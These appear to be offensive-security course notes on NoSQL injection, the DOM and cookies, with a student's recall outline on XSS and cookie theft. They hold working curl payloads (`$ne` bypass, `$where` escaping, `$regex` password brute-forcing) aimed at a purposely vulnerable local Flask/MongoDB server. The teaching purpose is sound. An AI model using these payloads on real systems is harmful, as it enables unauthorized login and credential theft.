# Post-lec Recall
- Part 1: no-sql database
	- def(no-sql) and motivation of no-sql 
		- data is not stored inside individual tables
		- problem with sql: inflexible structure. Every entry must have a non-empty value for every column
			- TODO: Think of a scenario where you have a table with many columns, and many entries don't have a value for a lot of columns
			- Scenario: it's a social media database. Every user has different amounts of posts. Wouldn't it be nice to have everything related to this user - their likes, comments, posts, followings, followers - all inside a single object? 
	- How is this different from sql injection?
		- Query syntax is different
	- No-sql Techniques
		- Toolbox
			- regex 
				- ^ means begins with
			- query operators
				- less than, equal to, not in...
				- you can use query operators in your inputs to dynamically select something from the database
					- e.g. as opposed to entering a specific username or password, you can enter a query that says any string that is not empty
			- * Highlight * Binary search a character when brute-forcing something
				- By combining its ASCII value and < or > operators 
					- username  = "admin"and password = "^query operator less than a specific ASCII value"
	- Protections against no-sql?
		- 
- Part 2: cross-site scripting (XSS)
	- name origin
		- Discovered new technique during a CTF. They were going to call it CSS for cross-site-scripting, but CSS already means cascading style sheets, so XSS it is.
	- What is XSS?
		- As a client, you attack ANOTHER CLIENT through an injectable website
		- Gist: inject JavaScript code into the website that lives on the server > when another client fetches the resource you posted > malicious JS code runs
	- Types of XSS
		- Reflected XSS
			- Think of it as reflected upon yourself
			- You induce the victim to inject JS code into their browser. But whatever interesting results get popped back to them only...not very useful for us attackers...
				- How to induce victim to inject JS code into their browser?
					- they leave their computers open. you enter sth into their browser when they don't notice
					- phishing. You send them sth that looks legitimate, they click on the link which is the URL with injected JS scripts and they run it
			- Techniques
				- get the cookie through the DOM property `document.cookie` and 
		- "Let's give reflected XSS its fangs..."
		- Stored XSS
			- You inject JS code that lives on the server accessible by other clients
				- e.g. on a public message board, comment section 
			- When other clients click to see the comment, it renders, and because the code sits between `<script>` tags, JS code runs
	- Attacks you can do with XSS
		- Steal other clients' (esp admin) cookies
			- Why? 
				- Cookies are temporary login credentials. With their cookies, as long as they are valid, you can log-in as them. 
			- How?
				- (Force a POST) Induce victim to send their cookie (via a HTTP POST request) to the website that has a publicly viewable section (e.g. comment section)
				- (Force a GET) Induce victim to send their cookie (via a HTTP GET request) to a malicious domain that you can access
					- Why GET?? The whole point is not it being a GET. The gist is that inside the GET request, you write code that appends `document.cookie`, such that when you on the malicious domain receives the GET request, you also see the victim's cookie. It's essentially a POST for the cookie, through the vehicle of a GET.
	- Protections against XSS
		- CSP content safety? policy
			- When other clients fetch resources from the web server, the web server attaches to the header a list of safe domains from which the client can run scripts from. 
				- If I inject JS code onto the web server, the source domain would be my IP. If my IP is not part of the web server's CSP list, then my code will not be run as JS script by other clients when they render my injected code
					- Bypass:
						- When I inject code, I attach a source that is part of the CSP list of this web server (requires some research)
							- What's that github repo with a list of safe domains I can exploit?




# Lecture Notes
We finish our lessons on Web exploitation with two vulnerability classes. The first is NoSQL injection, a technique used on non-relational databases that store records of associated data. As NoSQL databases like MongoDB continue to grow in popularity, so does the importance of understanding and testing NoSQL systems. The second is one of the most well-known and powerful OWASP Top 10 Vulnerabilities: cross-site scripting (XSS). XSS allows for execution of arbitrary Javascript code into a client or server and can be used to steal information, such as access cookies. 

Like last lesson, to understand the vulnerabilities we first need to understand the underlying programming languages. We start by setting up a MongoDB NoSQL server to learn different forms of query syntax and common deployment means within a Python Flask server. We then turn to a new exploitation technique, specific to NoSQL databases, using query operators. 

Then, we seek to understand how Javascript is used to extend functionality within browsers. We also briefly discuss cookies, their importance, and common pitfalls when creating cookie values. With that understanding, we start with a basic form of XSS through a GET URL parameter to demonstrate arbitrary Javascript execution on a target. Next, we discuss how to store arbitrary Javascript on a server to target anyone who visits a page that loads that resource. We extend our arbitrary Javascript with the `XMLHttpRequest` object to leak cookies from a target.

Finally, we discuss Content Security Policy and how it mitigates certain forms of XSS. However, there are still means of circumventing this mitigation, and we demonstrate that bypass using JSONP endpoints.

Let's dive into our last web lesson and throw our first NoSQL and XSS payloads!

Table of Contents
* [[#NoSQL]]
	* [[#Setting Up a MongoDB Server]]
	* [[#Setting up a Python Server with MongoDB Compass]]
	* [[#NoSQL Injection]]
* [[#The DOM]]
	* [[#Callbacks]]
* [[#Cookies]]
	* [[#Impersonating Other Users]]
	* [[#Accessing Cookies with Javascript]]
	* [[#Cookie Pitfalls]]
* [[#XSS]]
	* [[#Stored XSS]]
	* [[#Leaking Data with XSS]]
	* [[#XMLHttpRequest]]
* [[#CSP]]
* [[#Recitation]]
* [[#Next Steps]]

## NoSQL

NoSQL databases are an alternative to relational databases like SQL. They are more flexible than SQL as entries, called "records," need not have a defined schema within a table—records can be expected to contain some minimum set of fields and can optionally include additional data relevant to the given entry, if needed. MongoDB is a common NoSQL implementation that is very popular in modern applications.

In the following sections we will set up a MongoDB server to help understand normal queries for a username and password, and then discuss different means of injection to bypass authentication and leak information from the database.

### Setting Up a MongoDB Server

First, go to [MongoDB](https://www.mongodb.com/) and set up an account. Create a new project and add yourself as a user of the project. In the project menu, build a new Cluster and choose the M0 (free) option. This is more than enough storage for the following brief demos as we experiment with MongoDB. 

![[mongo_db_build_cluster.png]]

Choose any provider and location which is convenient. Automating the security setup is fine for our purposes. Click "Create Deployment" to spin up a new Atlas database. _Note the IP, your username, and password as these are essential for connecting to the DB and are lost after proceeding._ Create the database user and then click "Choose a Connection Method."

![[mongo_db_choose_connection.png]]

There are a variety of ways to connect, which you can experiment with or choose on your own if you are an experienced MongoDB user. For newcomers, the MongoDB Compass app is a useful starting point to visualize database contents and validate that our queries function as expected. Click on the "Compass" option and install the GUI for your host. _Copy the connection string, which includes authorization credentials and will be lost after closing the window_.

```
mongodb+srv://<username>:<password>@<cluster-name>.riccg.mongodb.net/
```

Open MongoDB Compass and add a connection using the `+` symbol in the "Connections" panel on the left. Add the URI copied from the Compass connection method, as shown below. Feel free to name the connection as desired; the following example names it `offsec`.

![[mongo_db_compass_new_connection.png]]

The connection then shows up on the left-hand panel. Click on it and choose "Create Database." For the following example, the database name is `test` and the collection (table) name is `users`.

![[mongo_db_compass_create_database.png]]

With the database and collection (table) spun up, we are ready to interface with it using a Python server!

### Setting up a Python Server with MongoDB Compass

First, add the Python library for connecting and managing the database:

```sh
pip3 install pymongo
```

We can use the username and password generated through the same Compass URI to connect to the database with a script. This allows us to easily add users and perform queries, just like a production server would. 

Let's start by adding two records (users) with three fields, as shown below:

```python
from pymongo import MongoClient

MONGO_URI = "mongodb+srv://<username>:<password>@<cluster-name>.riccg.mongodb.net/"
client = MongoClient(MONGO_URI)

# Select the database and collection
db = client['test]
users_collection = db['users']

# Data to insert
users_data = [
    { "idx": 0, "username": "admin", "password": "pass" },
    { "idx": 1, "username": "noob", "password": "fail" }
]

# Insert the data
result = users_collection.insert_many(users_data)
```

Running this script on the command line should result in changes in the MongoDB Compass application! _Make sure to refresh if nothing appears. If the database or collection name in the script does not match those used in creating the database, the data may end up in another location inside the cluster_.

![[mongo_db_compass_after_entry.png]]
With data in the database we are ready to write a simple server to mimic a production login handler. First, install Python's Flask library with the following command. This will serve as our simple server.

```bash
pip3 install flask
```

> Flask is a convenient Python alternative to robust and heavy Javascript frontend libraries. It allows a user to quickly define web routes (e.g., `/`) and associated functionality when those routes are hit. It also defines the methods accepted and can easyily fetch GET and POST parameters, much like PHP.

The [[server.py]] script, shown below, fields POST requests to `/login` and compares the JSON POST parameters to username and passwords in the MongoDB database. Any match returns _the first_ record matched.

```python
from flask import Flask, jsonify, request
from pymongo import MongoClient

app = Flask(__name__)

MONGO_URI = "mongodb+srv://<username>:<password>@offsec-cluster.riccg.mongodb.net/"
client = MongoClient(MONGO_URI)
db = client['test']
collection = db['users']

@app.route('/login', methods=['POST'])
def authenticate():
    data = request.json
    username = data.get('username')
    password = data.get('password')

    user = collection.find_one({"username": username, "password": password}, {"_id": 0})

    if user:
        return jsonify({"message": "Authentication successful", "user": user}), 200
    else:
        return jsonify({"error": "Invalid username or password"}), 401

# Function to initialize the database with default entries
def init_db():
    if collection.count_documents({}) == 0:  # Check if the collection is empty
        default_users = [
            {"id": 1, "username": "admin", "password": "pass"},
            {"id": 2, "username": "noob", "password": "fail"},
        ]
        collection.insert_many(default_users)

if __name__ == '__main__':
    init_db()
    print("database initialized")
    app.run(host='0.0.0.0', port=9000, debug=True)
```

Run the server on the command line and the output should indicate it is running on port 9000, and that the database is initialized (if not already).

```console
$ python3 server.py
database initialized
 * Serving Flask app 'server'
 * Debug mode: on
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on http://127.0.0.1:9000
Press CTRL+C to quit
 * Restarting with stat
database initialized
 * Debugger is active!
 * Debugger PIN: 106-794-358
```

> Flask's default port is 5000, which may overlap Mac's Airplay Receiver running on `localhost:5000`. So long as we connect to `127.0.0.1` in a browser this is not an issue, but attempting `localhost:5000` will fail. To avoid any problems, simply add `port=XXXX` as an argument to the `app.run()` command to change the deployment port to one without a conflict.

We can double-check the server functions correctly with a simple `curl` POST request to `127.0.0.1:9000` with valid credentials:

```Shell
curl -X POST http://127.0.0.1:9000/login \
	-H "Content-Type: application/json" \
	-d '{"username": "admin", "password": "pass"}'
# response should look like:
{
  "message": "Authentication successful",
  "user": {
    "idx": 0,
    "password": "pass",
    "username": "admin"
  }
}
```

Great! With our server responding we should be able to experiment with NoSQL injection to leak information!

#### Setting Up a Python Server with Local DB

A nice, portable alternative that does not rely on MongoDB online is setting up a local database with Docker. The only modification we need to make to the server is connecting to a local database, as included in [[local_server.py]]:

```diff
--- server.py	2024-10-02 18:51:06
+++ local_server.py	2024-10-02 18:50:57
@@ -3,8 +3,7 @@
 
 app = Flask(__name__)
 
-MONGO_URI = "mongodb+srv://<username>:<password>@<cluster>-name>.riccg.mongodb.net/"
-client = MongoClient(MONGO_URI)
+client = MongoClient('mongodb', 27017)
 db = client['test']
 collection = db['users']
```

Then, we can write a Dockerfile (in `src/lesson12/nosql`) that installs the required Python utilities and exposes our server at runtime. 

```Dockerfile
FROM python:3.10-slim
WORKDIR /app
COPY ./local_server.py /app
RUN pip install --no-cache-dir flask pymongo
EXPOSE 9000
CMD python3 local_server.py
```

Next, we can use a simple `docker-compose` script to build this image and run it alongside a local MongoDB instance, exposing the required 27017 for the database connection. The [[docker-compose.yaml]] file is shown below:

```yaml
version: "3.8"

services:
  web:
    build: .
    ports:
      - "9000:9000"
    depends_on:
      - mongodb

  mongodb:
    image: mongo:latest
    ports:
      - "27017:27017"
```

Navigating to `src/lesson12/nosql` and running `docker compose up --build` will build the local image, run our server, and connect to the database! Now we're ready to test on a local instance.

### NoSQL Injection
- Types
	- 1
	- 2

We will review two forms of NoSQL injection (NoSQLi) in the remainder of this section. The first feels a lot like Blind SQLi reviewed in the last lesson, so we'll primarily focus our attention on the latter to expand our knowledge and experience. 

#### Escaping Query Strings

Like the SQL queries we reviewed last lesson, a server can construct a query using input directly from a user. In NoSQL, this may look like a `"$where": "this.username == 'username' && this.password == 'password'"` where `username` and `password` are pulled directly from the GET or POST parameters. [[server_escaped.py]] is an example server that does this, and the difference in its query from the prior [[local_server.py]] is shown below:

```diff
--- local_server.py	2024-10-02 19:11:35
+++ server_escaped.py	2024-10-02 19:11:46
@@ -1,4 +1,4 @@
-from flask import Flask, jsonify, request
+from flask import Flask, request
 from pymongo import MongoClient
 
 app = Flask(__name__)
@@ -7,18 +7,22 @@
 db = client['test']
 collection = db['users']
 
-@app.route('/login', methods=['POST'])
-def authenticate():
-    data = request.json
-    username = data.get('username')
-    password = data.get('password')
+@app.route('/login', methods=['GET'])
+def login():
+    username = request.args.get('username')
+    password = request.args.get('password')
 
-    user = collection.find_one({"username": username, "password": password}, {"_id": 0})
+    # Construct the query using $where
+    query = {
+        "$where": f"this.username == '{username}' && this.password == '{password}'"
+    }
 
+    user = collection.find_one(query)
+
     if user:
-        return jsonify({"message": "Authentication successful", "user": user}), 200
+        return f"Login successful! Welcome, {user['username']}!", 200
     else:
-        return jsonify({"error": "Invalid username or password"}), 401
+        return "Invalid username or password.", 401
 
 def init_db():
     if collection.count_documents({}) == 0:
```

Run this example by navigating to `src/lesson12/nosql_escaped` and running `docker compose up --build`. We can test a valid query with a standard GET request like below:

```shell
curl "http://localhost:9000/login?username=admin&password=pass"
# Login successful! Welcome, admin!
curl "http://localhost:9000/login?username=admin&password=fail"
# Invalid username or password.
```

Attacking this server is accomplished in the same manner as SQLi—we need to escape the query string so that the JSON is interpreted differently. 

```shell
curl "http://localhost:9000/login?username=admin'||'a'=='b"    
# Login successful! Welcome, admin!
```

This query passes because `"$where": "this.username == 'admin' || 'a'=='b && this.password == ''"`. The first clause matches on the `admin` record and the second fails a comparison, but because of the `||` operator we receive the `admin` record!

We can use `this.password[X]` to iterate through the matched record and compare it with a given character, using the 200 responses as positive feedback that we're making progress on the password. For example, we can construct the query `username=admin' && this.password[0] == 'a' || 'a'=='b"` to compare the first character of the `admin` user's password to `'a'`. If this fails, we can try another character until we succeed. _Note that we need to URL encode the `&`, `[` and `]` characters, otherwise they will not be sent/accepted._

```shell
curl "http://localhost:9000/login?username=admin'%26%26this.password%5b0%5d=='a'||'a'=='b"
# Invalid username or password.

curl "http://localhost:9000/login?username=admin'%26%26this.password%5b0%5d=='p'||'a'=='b"
# Login successful! Welcome, admin!
```

This approach works in much the same way as response-based Blind SQLi from the prior lesson, and we can use the same brute-forcing strategy to leak user information from the database!

#### Attacking Query Comparisons

Escaping query strings does not help us with the [[server.py]] (and [[local_server.py]]) server, however, because its query parses the parameters independently and fetches them using a JSON dictionary:

```python
    data = request.json
    username = data.get('username')
    password = data.get('password')

    user = collection.find_one({"username": username, "password": password}, {"_id": 0})
```

Trying to escape the `username` does not have the same effect because queries are matched by `key:value`—the username is interpreted as a string value on its own so we cannot use `'` to escape the overarching query. That is where query comparisons come in.

[Query comparisons](https://www.mongodb.com/docs/manual/reference/operator/query-comparison/) are handy operators for performing more robust filtering within a predefined JSON query. For example, if we wanted to search for usernames that were not in the list `["admin", "admin2"]`, we could query:

```json
{
    "username": {
        "$nin": [
            "admin",
            "admin2"
        ]
    },
    "password": "fail"
}
```

The list of query operators, pulled from the link above, is included here for quick reference:

| Name                                                                                              | Description                                                         |
| ------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------- |
| [`$eq`](https://www.mongodb.com/docs/manual/reference/operator/query/eq/#mongodb-query-op.-eq)    | Matches values that are equal to a specified value.                 |
| [`$gt`](https://www.mongodb.com/docs/manual/reference/operator/query/gt/#mongodb-query-op.-gt)    | Matches values that are greater than a specified value.             |
| [`$gte`](https://www.mongodb.com/docs/manual/reference/operator/query/gte/#mongodb-query-op.-gte) | Matches values that are greater than or equal to a specified value. |
| [`$in`](https://www.mongodb.com/docs/manual/reference/operator/query/in/#mongodb-query-op.-in)    | Matches any of the values specified in an array.                    |
| [`$lt`](https://www.mongodb.com/docs/manual/reference/operator/query/lt/#mongodb-query-op.-lt)    | Matches values that are less than a specified value.                |
| [`$lte`](https://www.mongodb.com/docs/manual/reference/operator/query/lte/#mongodb-query-op.-lte) | Matches values that are less than or equal to a specified value.    |
| [`$ne`](https://www.mongodb.com/docs/manual/reference/operator/query/ne/#mongodb-query-op.-ne)    | Matches all values that are not equal to a specified value.         |
| [`$nin`](https://www.mongodb.com/docs/manual/reference/operator/query/nin/#mongodb-query-op.-nin) | Matches none of the values specified in an array.                   |

A particularly powerful operator is `$ne`. Let's experiment a bit with it. Again, run the default [[local_server.py]] example by navigating to `src/lesson12/nosql` and running `docker compose up --build`. First, we can test a request we know should pass: submitting a username that does not equal `""` and a password `pass`. Since we know the pair `admin:pass` is in the database, this should fulfill the request and return a user.

```shell
curl -X POST http://127.0.0.1:9000/login \
	-H "Content-Type: application/json" \
	-d '{"username": {"$ne": ""}, "password": "pass"}'
# should return the following
{
  "message": "Authentication successful",
  "user": {
    "idx": 0,
    "password": "pass",
    "username": "admin"
  }
}
```

But this example assumes knowledge of a password in the database. That is not necessarily a realistic scenario. What if we instead use `$ne` in the `password` field, requesting a record for the `admin` user with a non-blank password:

```shell
curl -X POST http://127.0.0.1:9000/login \
	-H "Content-Type: application/json" \
	-d '{"username": "admin", "password": {"$ne": ""}}'
# should return the following
{
  "message": "Authentication successful",
  "user": {
    "id": 1,
    "password": "pass",
    "username": "admin"
  }
}
```

It returns a result! We just used the `$ne` operator to force some unexpected behavior and leak information from the database without knowing _any_ password.

We can use it to similarly isolate different users, such as selecting any non-`admin` user in the database:

```shell
curl -X POST http://127.0.0.1:9000/login \
	-H "Content-Type: application/json" \
	-d '{"username": {"$ne": "admin"}, "password": {"$ne": ""}}'
# should return the following
{
  "message": "Authentication successful",
  "user": {
    "idx": 1,
    "password": "fail",
    "username": "noob"
  }
}
```

#### Blind NoSQLi with Query Operators

While this `$ne` test was useful for understanding valid and invalid queries, it is not necessarily representative of a real-world server (as in, real-world servers wouldn't write "$ne" within the password check...). Most servers will respond with some error-based or status-based indicator as to whether a query succeeded—it will generally not print out the record directly. That said, we can use similar Blind SQLi techniques to leak data within a record byte-by-byte.

MongoDB allows for [`regex`](https://www.mongodb.com/docs/manual/reference/operator/query/regex/) filters within a query. We can perform a similar match to Blind SQLi in the last lesson or the prior `this.password[0]` comparison using the `^` [operator](https://support.workiva.com/hc/en-us/articles/4407304269204-Regular-expression-operators). This compares the start of the string with the subquery provided.

> We will not cover the regex language here, but it is a powerful utility to find and match substrings. This [regex playground](https://regexr.com/) is particularly useful for experimenting and confirming queries are operating as intended.

For example, we can check if the password starts with `'a'` using `^a`. If we get an error back, we can continue iterating through the characters.

```shell
curl -X POST http://127.0.0.1:9000/login \
-H "Content-Type: application/json" \
-d '{"username": "admin", "password": {"$regex": "^a" }}'
# should return the following
{
  "error": "Invalid username or password"
}

❯❯   curl -X POST http://127.0.0.1:9000/login \
-H "Content-Type: application/json" \
-d '{"username": "admin", "password": {"$regex": "^p" }}'
# should return the following
{
  "message": "Authentication successful",
  "user": {
    "id": 1,
    "password": "pass",
    "username": "admin"
  }
}
```

Once we have a match for the first character, we can continue with a longer substring to brute force the password, byte-by-byte!

## The DOM

Before we dive into XSS, we need to understand how Javascript manages websites. And before that, we need to understand the Document Object Model, or DOM. The [DOM](https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model/Introduction) is "the data representation of the objects that comprise the structure and content of a document on the web," including XML and HTML web pages. The key concept is that sites are a "tree" of objects. In HTML, every HTML tag (`<html>`, `<p>`, `<div>`, etc.) is an object. This structure allows us to program web pages with HTML directly and apply formatting with CSS tags. It also exposes an interface for higher-level languages like Javascript to manipulate the page in various ways. An example DOM HTML tree is below:

![[DOM_HTML_tree.gif]]
_Source: [w3schools.com](https://www.w3schools.com/js/pic_htmltree.gif)_

Javascript accesses the DOM through the `document` object. To demonstrate, consider the simple "Hello World" web page:

```html
<!DOCTYPE html>
<html>
<body>

<h1 id="myHeading">Hello World!</h1>

</body>
</html>
```

We can use the `id` of the heading from within Javascript to select the header with `document.getElementById` and manipulate the header text with the `textContent` method.

```javascript
const heading = document.getElementById("myHeading");
heading.textContent = "JavaScript is Awesome!";
```

If we add the script into the HTML directly within `<script></script>` tags, as shown in [[simple_dom.html]], it will manipulate the HTML while rendering the site.

```html
<!DOCTYPE html>
<html>
<body>

<h1 id="myHeading">Hello World!</h1>

<script>
  const heading = document.getElementById("myHeading");
  heading.textContent = "JavaScript is Awesome!";
</script>

</body>
</html>
```

The result is that we see the header "JavaScript is Awesome!" when loading the file in our browser.

### Callbacks

When the browser encounters a `<script>` tag while rendering a resource, it will fetch that resource and execute the Javascript code. This is particularly helpful for callbacks when the user interacts with the site in some way. Consider the simple sites in [[10. Common PHP Vulnerabilities|Lesson 10]]—in PHP, user interaction such as submitting a form required fetching and rendering a new resource. We can perform similar actions in Javascript with callback handlers that directly manipulate the DOM instead of fetching and rendering a new page.

Consider the example site, [[callback_dom.html]], which asks the user for their name. 

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Simple Form with Callback</title>
    <script>
        function handleSubmit(event) {
            event.preventDefault(); // Prevent the default form submission
            const name = document.getElementById('name').value;
            const resultDiv = document.getElementById('result');
            resultDiv.textContent = `Hello, ${name}! Your form has been submitted.`;
        }
    </script>
</head>
<body>
    <h1>Submit Your Name</h1>
    <form id="myForm" onsubmit="handleSubmit(event)">
        <label for="name">Name:</label>
        <input type="text" id="name" name="name" required>
        <button type="submit">Submit</button>
    </form>
    <div id="result"></div>
</body>
</html>
```

The HTML for the site is pretty lean, and there is no CSS or Javascript formatting performed on the initial load.

![[form_callback_before.png]]

Clicking the submit button triggers the HTML [`onsubmit` attribute.](https://www.w3schools.com/tags/ev_onsubmit.asp) This is an exposed attribute for executing a desired Javascript callback; in this case, the `handleSubmit` function with the document's [`SubmitEvent` event](https://developer.mozilla.org/en-US/docs/Web/API/SubmitEvent) as an argument. Javascript can access the DOM, including the `name` ID from the form data and the `result` `<div>`, which was rendered with no value. Leveraging `resultDiv.textContent` renders the submitter's name into the `<div>` without loading any other HTML resources!

![[form_callback_after.png]]

#### Alerts

Another option that does not update HTML is leveraging Javascript's `alert` functionality. This is the quintessential "pop-up box" that users experience when interacting with websites. The following [[callback_dom_alert.html]] example changes the callback handler to pop an alert rather than updating the DOM:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Simple Form with Callback</title>
    <script>
        function handleSubmit(event) {
            event.preventDefault(); // Prevent the default form submission
            const name = document.getElementById('name').value;
            alert(`Hello, ${name}! Your form has been submitted.`);
        }
    </script>
</head>
<body>
    <h1>Submit Your Name</h1>
    <form id="myForm" onsubmit="handleSubmit(event)">
        <label for="name">Name:</label>
        <input type="text" id="name" name="name" required>
        <button type="submit">Submit</button>
    </form>
</body>
</html>
```

![[form_callback_alert.png]]

Alerts are handy when testing a website for arbitrary Javascript execution. We will leverage them later in this lesson.

## Cookies

One of the most valuable pieces of information accessible through the DOM is not part of HTML, but HTTP requests/responses: cookies. Cookies are user-specific strings that may indicate user preferences, authentication status, and anything required to make a user's session personalized. Cookies are a hot topic in privacy, but they are also important from a security perspective. A HTTP server uses cookies to indicate a user has authenticated to a site and signal that otherwise protected pages can be accessed. Stealing a user's authentication cookie and inserting it into a forged request effectively impersonates the authenticated user and can provide unauthorized access to resources.

Consider this simple server, [[cookie.py]], written in Python's Flask library. This simple server has three URL routes:
1. `/`, which loads the `templates/index.html` file (more on this in a second)
2. `/get_cookie` which accepts a `POST` request with a username and generates a random cookie for the given user. The server uses the `set_cookie` function with the generated value to tell the client to set its `userCookie` cookie accordingly
3. `/authenticate` which accepts a `GET` request. The server extracts the `userCookie` cookie value from the request and compares it against any of the known cookies in the current session.

```python
from flask import Flask, request, render_template, make_response
import secrets

app = Flask(__name__)

# Dictionary of credentials in lieu of a database
creds = dict()
creds["admin"] = "1ce4644965fb631a5b9c7ce396b5f50b"

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/get_cookie', methods=['POST'])
def login():
    data = request.get_json()
    username = data.get('username')
    user_cookie = secrets.token_hex(16)
    creds[username] = user_cookie

    response = make_response(f'{username}! your cookie is: {user_cookie}')
    response.set_cookie('userCookie', user_cookie)
    return response

@app.route('/authenticate', methods=['GET'])
def check_user_cookie():
    user_cookie = request.cookies.get('userCookie')
    user = next((username for username, cookie in creds.items() if cookie == user_cookie), None)
    if user_cookie and user is not None:
        if user == "admin":
            return 'Admin login successful! Welcome back', 200
        else:
            return 'User cookie found. Login successful for ' + user, 200
    return 'No user cookie found', 403

if __name__ == '__main__':
    app.run(debug=True, port=9000)
```

In normal operation, a user would login and have their cookie set by the server to indicate the authentication was successful. For example, we can run the program by navigating to `src/lesson12/cookies` and running `python3 cookie.py`. Opening `127.0.0.1:9000` in a browser shows the following `index.html` landing page:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
</head>
<body>
    <h2>Get Cookie</h2>
    <input type="text" id="username" placeholder="Enter your username" required>
    <button id="cookieButton">Submit</button>
    <div id="cookieResponse" style="margin-top: 10px;"></div>

    <h2>Authtenticate</h2>
    <button id="authenticateButton">Submit</button>
    <div id="authenticateResponse" style="margin-top: 10px;"></div>

    <script>
        // Function to login
        document.getElementById('cookieButton').addEventListener('click', function() {
            const username = document.getElementById('username').value;

            fetch('/get_cookie', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ username })
            })
            .then(response => {
                if (response.ok) {
                    return response.text();
                } else {
                    throw new Error('Failed to get cookie');
                }
            })
            .then(data => {
                document.getElementById('cookieResponse').textContent = data;
            })
            .catch(error => {
                document.getElementById('cookieResponse').textContent = error.message;
            });
        });

        // Function to login
        // JS knowledge: Promise chaining (async)
        // when Promise hasn't resolved, the rest of the code (beyond this chain) continues executing
    
        document.getElementById('authenticateButton').addEventListener('click', function() { // Run this function when "click" event is observed
	            fetch('/authenticate')// returns a Promise
	            // this Promise resolves when the request action completes
	            // this Promise resolves into a Response object

	            .then(response => {// first .then() receives the Response Object
                if (response.ok) {
                    return response.text();
                } else {
                    throw new Error('Login failed');
                    // ^ error will be caught in .catch 
                }
            })// if the frst .then() was successful
	            // receives return val from the first .then()
            .then(data => {
	                document.getElementById('authenticateResponse').textContent = data;// make it equal to the fetched data
            })
            .catch(error => {
                document.getElementById('authenticateResponse').textContent = error.message;
            });
        });
    </script>
</body>
</html>
```

> This Javascript code might look different and intimidating, but it's basically the same functionality demonstrated earlier in the `onsubmit` attribute. Instead of using `onsubmit`, this example shows Javascript's DOM `addEventListener` function which can be added to a DOM object event. This simple page has two buttons: `cookieButton` and `authenticateButton`. Clicking the former triggers the first Javascript function which generates a POST request to the `get_cookie` URL with the provided username. Clicking the latter generates a GET request to `authenticate`. All requests will tacitly use any cookies the browser previously stored.

We see the change in server state by opening our browser's developer tools ([instruction for Chrome](https://developer.chrome.com/blog/devtools-tips-15), [instructions for Firefox](https://firefox-source-docs.mozilla.org/devtools-user/)) and navigating to the `>> -> Application -> Cookies` tab in Chrome or `Storage -> Cookies` in Firefox to see any existing browser-stored cookies. Entering a username and generating a cookie shows a new unique cookie provided to our user!

![[cookie_set.png]]
If we naturally proceed and click the "Authenticate" button, the browser hits the Javascript callback to send a GET request to the server's `/authenticate` URL. Because the cookie is set, the server receives the user's previously established authentication info and can confirm the user is logged in! We can confirm this by navigating to the `Network` tab in the Developer Tools, clicking the button, and inspecting the `Headers -> Request Headers` to see the GET request with `userCookie` cookie:

![[cookie_login.png]]
### Impersonating Other Users

Because cookies are a means of proving user identity, using someone else's cookie is a way of impersonating another (authenticated) user. We can see this in the prior example which includes a hard-coded `admin` cookie for an admin user (`1ce4644965fb631a5b9c7ce396b5f50b`). If we were able to leak this value by some means then we could impersonate the site's admin, perhaps exposing elevated privileges or functionality. We can test this by navigating back to the browser's cookie store and editing the value of the cookie directly in the browser. Copying and pasting the admin's cookie value and clicking the "Authenticate" button shows that we did not just log in, but that we were identified as the admin!

![[cookie_login_admin.png]]
> Cookies should never be hardcoded. We cover more cookie security concerns in the [[#Cookie Pitfalls]] section.

Because cookies are inherently trusted, they are often the target of attackers for CTF challenges and real work targets alike. The ability to authenticate to a website as another user using a stolen cookie is a severe vulnerability—it potentially exposes user information such as account info and password reset options so that an attacker can completely control the user's account going forward. Thus, cookie security is critical and discussed more later in this lesson.

### Accessing Cookies with Javascript

Javascript can access cookies directly through the DOM with `document.cookie`. We can demonstrate this with the prior example by navigating to the Developer Tools `Console` which is a Javascript REPL for the given session. Entering the following command prints out all session cookies, which includes our singular `userCookie` value. 

```javascript
console.log(this.document.cookie)
userCookie=fb3b867055f75bbbe155e070f58bc131
```

We'll use this functionality in the following [[#XSS]] section to demonstrate how to exfiltrate cookies from another user when we do not have access to their DOM.

### Cookie Pitfalls :(

Cookies are meant to serve as an ephemeral means of validating user authentication and thus eliminate the need for the user to authenticate every time a privileged or personal resource is requested during a single session. Because of the aforementioned impacts of cookie theft, their security is extremely important. Some common mistakes for web development regarding cookies follows.

#### Bad Randomisation

First, cookies should always be a random value. It may be tempting to make a cookie some hashed value of user information or system state, with the assumption that if the hash algorithm is secure then the user is protected. This should not be assumed. For example, Wordpress originally created user cookies [based on a combination of username and expiration time](https://nvd.nist.gov/vuln/detail/CVE-2008-1930). This is prone to attacks if the username (e.g., `admin*`) and expiration timeout can be guessed. 

Furthermore, databases of common hashes exist; even if the hash algorithm is secure and the inputs cannot be guessed, it is possible to "brute force" the input using a dictionary of common hashes. For example, the MD5 hash of `password` is `5f4dcc3b5aa765d61d8327deb882cf99`. Simply Googling this value shows a slew of results indicating its input. Other tools like [CrackStation](https://crackstation.net/) contain dictionaries of common hashes that a user can query against.
![[md5sum_password.png]]
#### Not Enforcing Expiration Time

Cookies should _always_ expire and should expire within a _reasonable window_. It may be tempting to make cookies long-lived to improve user experience as it can be frustrating to constantly re-authenticate every time we navigate back to a commonly used site. But user security is paramount and choosing a reasonable window is important, especially when users may log in on devices that they do not own. [CVE-2023-23614](https://nvd.nist.gov/vuln/detail/CVE-2023-23614) is a great example of what not to do with cookies—the cookie value was tied to the password and, though Pi-hole stipulated a 7 day expiration, the cookie was valid so long as the admin's password did not change.

#### ? How to restrict access to cookies: HTTP-Only

It is beneficial to protect cookies from Javascript attacks (such as [[#XSS]]) by restricting the ability of Javascript to access them. [`HttpOnly`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#httponly) is an option for servers to restrict access, ensuring that cookies are only accessible through HTTP requests and responses. All modern browsers are equipped to handle HTTP-only cookies. OWASP has a [great guide](https://owasp.org/www-community/HttpOnly) outlining how to correctly implement this mitigation.
- Summary
